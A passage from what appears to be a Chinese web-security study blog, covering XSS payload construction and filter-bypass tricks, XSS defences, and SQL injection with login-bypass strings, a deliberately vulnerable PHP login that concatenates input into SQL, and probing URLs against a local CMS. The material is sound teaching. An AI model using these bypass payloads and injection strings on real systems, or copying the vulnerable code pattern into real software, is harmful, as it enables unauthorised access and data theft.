信息，也就是身份凭据，登录后台；</p></li><li><p>即使管理员注销登录，会话依然有效；</p></li><li><p>即使管理员修改了密码，会话依然有效。</p></li></ul><h4 id="2-1-6-防御"><a href="#2-1-6-防御" class="headerlink" title="2.1.6  防御"></a><strong>2.1.6</strong>  <strong>防御</strong></h4><ul><li><p>根据实际情况采用“单点登录”；、</p></li><li><p>采用Session 机制；</p></li><li><p>设置token 值；</p></li><li><p>对Cookie 数据，设置HttpOnly 属性；</p></li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Date</span>: Mon, <span class="number">23</span> Nov <span class="number">2020</span> <span class="number">02</span>:<span class="number">16</span>:<span class="number">57</span> GMT Server: Apache</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Powered-By: PHP/<span class="number">5</span>.<span class="number">6</span>.<span class="number">40</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Set</span>-Cookie: username=AJEST; expires=Mon, <span class="number">23</span>-Nov-<span class="number">2020</span> <span class="number">03</span>:<span class="number">16</span>:<span class="number">57</span> GMT; Max-Age=<span class="number">3600</span>; path=/; domain=localhost; httponly</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Keep</span>-Alive: timeout=<span class="number">5</span>, max=<span class="number">100</span> Connection: Keep-Alive</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: text/html; charset=UTF-<span class="number">8</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure><h2 id="3-XSS-攻防"><a href="#3-XSS-攻防" class="headerlink" title="3.XSS 攻防"></a>3.<strong>XSS</strong> 攻防</h2><h3 id="3-1-XSS-构造方法"><a href="#3-1-XSS-构造方法" class="headerlink" title="3.1 XSS 构造方法"></a><strong>3.1</strong> <strong>XSS</strong> 构造方法</h3><h4 id="3-1-1-利用"><a href="#3-1-1-利用" class="headerlink" title="3.1.1  利用&lt;&gt;"></a><strong>3.1.1</strong>  <strong>利用</strong><strong>&lt;&gt;</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u</span>=<span class="string">2866847033,2297252904&amp;fm</span>=<span class="string">26&amp;gp</span>=<span class="string">0.jpg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-1-2-javascript-伪协议"><a href="#3-1-2-javascript-伪协议" class="headerlink" title="3.1.2  javascript 伪协议"></a><strong>3.1.2</strong>  <strong>javascript</strong> <strong>伪协议</strong></h4><p>可以通过URL 载入资源的标签。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">javascript:alert(/xss/)</span> &gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span><span class="comment">&lt;!-- IE6 --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>XSS 攻击的是浏览器，受前端影响比较大。浏览器的类型，版本等因素都会影响XSS 的效果。 </p><p><strong>3.1.3</strong>  <strong>事件响应</strong></p><p>“事件驱动”是一种比较典型的编程思想。</p><table><thead><tr><th>事件类型</th><th>说明</th></tr></thead><tbody><tr><td>window 事件</td><td>对window 对象触发的事件</td></tr><tr><td>Form 事件</td><td>HTML 表单内触发的事件</td></tr><tr><td>Keyboard 事件</td><td>键盘事件</td></tr><tr><td>Mouse 事件</td><td>鼠标事件</td></tr><tr><td>Media 事件</td><td>由多媒体触发的事件</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span> = <span class="string">&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&amp;fm=26&amp;gp=0.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">onmouseover</span> = <span class="string">&#x27;alert(/dont touch me!/)&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span> = <span class="string">&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&amp;fm=26&amp;gp=0.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&#x27;text&#x27;</span> <span class="attr">onkeydown</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&#x27;text&#x27;</span> <span class="attr">onkeyup</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-1-4-其他标签"><a href="#3-1-4-其他标签" class="headerlink" title="3.1.4  其他标签"></a><strong>3.1.4</strong>  <strong>其他标签</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(/xss/)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-1-5-参考"><a href="#3-1-5-参考" class="headerlink" title="3.1.5  参考"></a><strong>3.1.5</strong>  <strong>参考</strong></h4><ul><li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-site scripting (XSS) cheat sheet</a></li></ul><h3 id="3-2-XSS-变形方式"><a href="#3-2-XSS-变形方式" class="headerlink" title="3.2 XSS 变形方式"></a><strong>3.2</strong> <strong>XSS</strong> 变形方式</h3><p>cms 网站搜索框存在反射性XSS 漏洞，POC 如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试在代码角度，对XSS 漏洞进行修复：修改 &#x2F;cms&#x2F;search.php  文件，对 $_GET[‘keywords’]  进行过滤，代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$keyword = $_GET[&#x27;keywords&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// $keyword = str_replace(&quot;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span>/i&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = preg_replace(&quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"> </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;on&quot;, &quot;o_n&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = preg_replace(&quot;/on/i&quot;, &quot;o_n&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;&lt;&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// $keyword = str_replace(&quot;&gt;&quot;, &quot;&quot;, $keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">$keyword = htmlspecialchars($keyword);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">echo $keyword;</span></span></span><br></pre></td></tr></table></figure><h4 id="3-2-1大小写转换"><a href="#3-2-1大小写转换" class="headerlink" title="3.2.1大小写转换"></a><strong>3.2.1</strong>大小写转换</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">ONerror</span> = <span class="string">&#x27;alert(/xss/)&#x27;</span> <span class="attr">src</span> = <span class="string">&quot;#&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-2-关键字双写"><a href="#3-2-2-关键字双写" class="headerlink" title="3.2.2  关键字双写"></a><strong>3.2.2</strong>  <strong>关键字双写</strong></h4><p>绕过一次过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_ invoke__">alert</span>(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-3-对伪协议进行转码"><a href="#3-2-3-对伪协议进行转码" class="headerlink" title="3.2.3  对伪协议进行转码"></a><strong>3.2.3</strong>  <strong>对伪协议进行转码</strong></h4><p>HTML 编码：</p><table><thead><tr><th>字母</th><th>ASCII码</th><th>十进制编码</th><th>十六进制编码</th></tr></thead><tbody><tr><td>a</td><td>97</td><td>&#97;</td><td>&#x61;</td></tr><tr><td>c</td><td>99</td><td>&#99;</td><td>&#x63;</td></tr><tr><td>e</td><td>101</td><td>&#101;</td><td>&#x65;</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:alert(/xss/) &#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-4-插入其他字符"><a href="#3-2-4-插入其他字符" class="headerlink" title="3.2.4  插入其他字符"></a><strong>3.2.4</strong>  <strong>插入其他字符</strong></h4><p>可以将以下字符插入到任意位置</p><p>字符                                                 编码</p><table><thead><tr><th>字符</th><th>编码</th></tr></thead><tbody><tr><td>Tab</td><td>&#9;</td></tr><tr><td>换行</td><td>&#10;</td></tr><tr><td>回车</td><td>&#13;</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;j<span class="symbol">&amp;#9;</span>avasc<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>将以下字符插入到头部位置。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;<span class="symbol">&amp;#01;</span><span class="symbol">&amp;#02;</span>j<span class="symbol">&amp;#9;</span>avasc<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-5-引号的使用"><a href="#3-2-5-引号的使用" class="headerlink" title="3.2.5  引号的使用"></a><strong>3.2.5</strong>  <strong>引号的使用</strong></h4><p>HTML 语言对引号的使用要求不严格，某些过滤函数是“锱铢必较”。</p><ul><li><p>没有引号</p></li><li><p>单引号</p></li><li><p>双引号</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">#</span> <span class="attr">OnErRoR</span>=<span class="string">alert(/xss/);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">OnErRoR</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span> = <span class="string">&quot;#&quot;</span> <span class="attr">OnErRoR</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-6-代替空格"><a href="#3-2-6-代替空格" class="headerlink" title="3.2.6  &#x2F; 代替空格"></a><strong>3.2.6</strong>  <strong>&#x2F;</strong> <strong>代替空格</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;Img/sRc=&#x27;#&#x27;/OnErRoR=&#x27;alert(/xss/)&#x27;&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-7-拆分跨站"><a href="#3-2-7-拆分跨站" class="headerlink" title="3.2.7  拆分跨站"></a><strong>3.2.7</strong>  <strong>拆分跨站</strong></h4><p>将一段JS 代码拆成多段。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z+=<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="regexp">/xss/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-3-XSS-的防御"><a href="#3-3-XSS-的防御" class="headerlink" title="3.3 XSS 的防御"></a><strong>3.3</strong> <strong>XSS</strong> 的防御</h3><p>​XSS 过滤器的作用是过滤用户（浏览器客户端）提交的有害信息，从而达到防范XSS 攻击的效果。</p><h4 id="3-3-1-输入过滤"><a href="#3-3-1-输入过滤" class="headerlink" title="3.3.1  输入过滤"></a><strong>3.3.1</strong>  <strong>输入过滤</strong></h4><ul><li><p>永远不要相信用户的输入。</p></li><li><p>输入验证：对用户提交的信息进行“有效性”验证。</p></li><li><p>仅接受指定长度；</p></li><li><p>仅包含合法字符；</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $_GET[&#x27;keywords&#x27;];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;keywords&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>); <span class="keyword">echo</span> <span class="variable">$keywords</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-3-2-输出编码"><a href="#3-3-2-输出编码" class="headerlink" title="3.3.2  输出编码"></a><strong>3.3.2</strong>  <strong>输出编码</strong></h4><p>HTML 编码是HTML 实体编码。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$keywords = htmlspecialchars( $_GET[ &#x27;keywords&#x27; ] );</span><br></pre></td></tr></table></figure><h4 id="3-3-3-黑白名单策略"><a href="#3-3-3-黑白名单策略" class="headerlink" title="3.3.3  黑白名单策略"></a><strong>3.3.3</strong>  <strong>黑白名单策略</strong></h4><p>不管是采用输入过滤还是输出编码，都是针对用户提交的信息进行黑、白名单式的过滤：</p><ul><li><p>黑名单：非允许的内容</p></li><li><p>白名单：允许的内容</p></li></ul><h4 id="3-3-4-防御DOM型XSS"><a href="#3-3-4-防御DOM型XSS" class="headerlink" title="3.3.4  防御DOM型XSS"></a><strong>3.3.4</strong>  <strong>防御</strong>DOM型<strong>XSS</strong></h4><p>避免客户端文档重写，重定向或其他敏感操作。</p><h4 id="3-3-5-终极测试代码"><a href="#3-3-5-终极测试代码" class="headerlink" title="3.3.5  终极测试代码"></a><strong>3.3.5</strong>  <strong>终极测试代码</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;sCr<span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>IPT&gt;OonN&#x27;&quot;\/(hrHRefEF)&lt;/sCr<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span>IPT&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-SQL-注入原理"><a href="#1-SQL-注入原理" class="headerlink" title="1.SQL 注入原理"></a>1.<strong>SQL</strong> 注入原理</h2><h3 id="1-1-万能用户名"><a href="#1-1-万能用户名" class="headerlink" title="1.1 万能用户名"></a><strong>1.1</strong> 万能用户名</h3><h4 id="1-1-1-万能用户名"><a href="#1-1-1-万能用户名" class="headerlink" title="1.1.1  万能用户名"></a><strong>1.1.1</strong>  <strong>万能用户名</strong></h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">777<span class="string">&#x27; or 1=1 # </span></span><br><span class="line"><span class="string">admin&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="1-1-2-查看代码"><a href="#1-1-2-查看代码" class="headerlink" title="1.1.2 查看代码"></a>1.1.2 查看代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">session_start</span> ();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); <span class="keyword">include_once</span> (<span class="string">&quot;../include/config.inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ( <span class="variable">$_POST</span> [<span class="string">&quot;username&quot;</span>] )) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span> [<span class="string">&quot;username&quot;</span>]; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ( <span class="variable">$_POST</span> [<span class="string">&quot;password&quot;</span>] )) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span> [<span class="string">&quot;password&quot;</span>]; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line"><span class="comment">//记住用户名</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span> (username, <span class="variable">$username</span>,<span class="title function_ invoke__">time</span>()+<span class="number">3600</span>*<span class="number">24</span>*<span class="number">365</span>); <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;用户名或密码不能为空！&#x27;);window.history.go(-1)&lt;/script&gt;&quot;</span>); &#125;</span><br><span class="line"><span class="variable">$user_row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getOneRow</span>(<span class="string">&quot;select userid from cms_users where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span> (</span><br><span class="line"><span class="variable">$password</span> ) .<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$user_row</span> )) &#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span> (userid, <span class="variable">$user_row</span> [<span class="string">&#x27;userid&#x27;</span>] ); <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;用户名或密码不正确！&#x27;);window.history.go(-1)&lt;/script&gt;&quot;</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-1-3-登录逻辑"><a href="#1-1-3-登录逻辑" class="headerlink" title="1.1.3  登录逻辑"></a><strong>1.1.3</strong>  <strong>登录逻辑</strong></h4><ul><li><p>通过POST 方式获取用户名和密码；</p></li><li><p>构造SQL 语句以用户名和密码作为查询条件进行查询，并且是单引号闭合；</p></li><li><p>如果SQL 语句正确执行并且结果集对象中有记录则提示登录成功；</p></li><li><p>否则，登录失败。</p></li></ul><h4 id="1-1-4-拼接问题"><a href="#1-1-4-拼接问题" class="headerlink" title="1.1.4  拼接问题"></a><strong>1.1.4</strong>  <strong>拼接问题</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select userid from cms_users where username = &#x27;&#123;用户名&#125;&#x27; and password=&#x27;&#123;md5(密码)&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">select userid from cms_users where username = &#x27;777&#x27; or 1=1 #&#x27; and password=&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-2-SQL-注入总结"><a href="#1-2-SQL-注入总结" class="headerlink" title="1.2 SQL 注入总结"></a><strong>1.2</strong> <strong>SQL</strong> 注入总结</h3><h4 id="1-2-1-SQL-注入原理"><a href="#1-2-1-SQL-注入原理" class="headerlink" title="1.2.1  SQL 注入原理"></a><strong>1.2.1</strong>  <strong>SQL</strong> <strong>注入原理</strong></h4><p>​SQL 注入的攻击行为可以描述为通过用户可控参数中注入SQL 语法，破坏原有SQL 结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p><ul><li>程序员在处理程序和数据库交互时，使用字符串拼接的方式构造SQL 语句。</li><li>未对用户可控参数进行足够的过滤，便将参数内容拼接到SQL 语句中。</li></ul><h4 id="1-2-2-SQL-注入危害"><a href="#1-2-2-SQL-注入危害" class="headerlink" title="1.2.2  SQL 注入危害"></a>1.2.2  <strong>SQL</strong> <strong>注入危害</strong></h4><p>攻击者可以利用SQL 注入漏洞，可以获取数据库中的多种信息，例如，后台管理员账密，从而脱取数据库中的内容（脱库）。</p><p>在特别的情况下还可以插入内容到数据库、删除数据库中的内容或者修改数据库内容。</p><p>如果数据库权限分配存在问题，或者数据库本身存在缺陷，攻击者可以利用SQL 注入漏洞直接获取WebShell 或者服务器权限。</p><h4 id="1-2-3-SQL-注入分类"><a href="#1-2-3-SQL-注入分类" class="headerlink" title="1.2.3  SQL 注入分类"></a><strong>1.2.3</strong>  <strong>SQL</strong> <strong>注入分类</strong></h4><table><thead><tr><th align="center">两大基本类型</th><th align="center">五大基本手法</th><th>提交参数方式</th><th>注入点的位置</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td><td></td><td></td></tr><tr><td align="center"></td><td align="center"></td><td></td><td></td></tr></tbody></table><h3 id="1-3-SQL-注入漏洞挖掘"><a href="#1-3-SQL-注入漏洞挖掘" class="headerlink" title="**1.3 SQL 注入漏洞挖掘"></a>**1.3 <strong>SQL</strong> 注入漏洞挖掘</h3><h4 id="1-3-1-注入点判断"><a href="#1-3-1-注入点判断" class="headerlink" title="1.3.1  注入点判断"></a><strong>1.3.1</strong>  <strong>注入点判断</strong></h4><table><thead><tr><th>1</th><th>-1 或 +1</th><th>是否能够回显上一个或者下一个页面（判断是否有回显）</th></tr></thead><tbody><tr><td>2</td><td>‘ 或 “</td><td>是否显示数据库错误信息；  根据回显内容可以判断是字符型数据还是数字型。</td></tr><tr><td>3</td><td>and 1&#x3D;1  and 1&#x3D;2</td><td>回显的页面是否不同（布尔类型的状态）</td></tr><tr><td>4</td><td>and sleep(5)</td><td>判断页面的返回时间</td></tr><tr><td>5</td><td>\</td><td>判断转义</td></tr></tbody></table><h4 id="1-3-2-主要关注的问题"><a href="#1-3-2-主要关注的问题" class="headerlink" title="1.3.2  主要关注的问题"></a><strong>1.3.2</strong>  <strong>主要关注的问题</strong></h4><table><thead><tr><th>回显</th><th>数据库中的内容是否会回显在网页中。</th></tr></thead><tbody><tr><td>数据库报错</td><td>数据库报错信息是否会回显在网页中。  提交的数据是字符型还是数字型，如果是字符型数据，闭合方式是什么？</td></tr><tr><td>布尔类型状态</td><td>显示的页面不同，形成对比。页面正常或者不正常。</td></tr><tr><td>延时</td><td>让数据库沉睡相应的秒数</td></tr></tbody></table><h4 id="1-3-3-CMS-注入点"><a href="#1-3-3-CMS-注入点" class="headerlink" title="1.3.3  CMS 注入点"></a><strong>1.3.3</strong>  <strong>CMS</strong> <strong>注入点</strong></h4><p><strong>是否有回显</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cms/show.php?id=33 http://127.0.0.1/cms/show.php?id=32 http://127.0.0.1/cms/show.php?id=34</span><br><span class="line"></span><br><span class="line">#  有回显</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>是否有报错</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cms/show.php?id=34&#x27;</span><br><span class="line"></span><br><span class="line"># near &#x27;&#x27;&#x27; at line 1</span><br><span class="line">#  中间的单引号才是SQL  语句的内容</span><br><span class="line"># select * from tb_name where id=34&#x27; #  34  没有出现在报错信息中，说明是数字型注入</span><br><span class="line"></span><br><span class="line">#  有报错</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>是否有布尔类型状态</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.128/cms/show.php?id=33+and+1=1 http://10.10.10.128/cms/show.php?id=33+and+1=2</span><br><span class="line"></span><br><span class="line">#  有布尔类型状态</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>是否有延时</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.128/cms/show.php?id=33+and+sleep(5)</span><br><span class="line"></span><br><span class="line">#  有延时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-4-其他知识补充"><a 